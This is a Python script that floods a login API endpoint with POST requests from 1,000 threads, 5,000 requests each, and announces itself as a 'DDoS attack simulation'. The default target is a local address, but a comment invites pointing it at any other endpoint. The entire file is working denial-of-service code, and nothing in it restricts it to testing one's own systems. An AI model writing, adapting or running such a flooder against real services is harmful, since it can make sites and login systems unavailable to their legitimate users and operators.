import requests
import threading

# Target URL
url = "http://127.0.0.1:8000/api/login"  # Example target login API
# You can change the URL to any other endpoint you want to target
num_threads = 1000  # Increase number of threads
requests_per_thread = 5000  # Increase requests per thread

# Function to send POST requests continuously
def send_requests():
    for _ in range(requests_per_thread):
        try:
            # Sending a POST request with dummy login credentials
            data = {"email": "test@test.com", "password": "password"}
            response = requests.post(url, json=data)
            print(f"Response Code: {response.status_code}")
        except requests.exceptions.RequestException as e:
            print(f"Request failed: {e}")

# Start attack by creating multiple threads
def start_attack():
    threads = []
    for _ in range(num_threads):
        thread = threading.Thread(target=send_requests)
        threads.append(thread)
        thread.start()

    # Wait for all threads to complete
    for thread in threads:
        thread.join()

if __name__ == "__main__":
    print("Starting DDoS attack simulation...")
    start_attack()
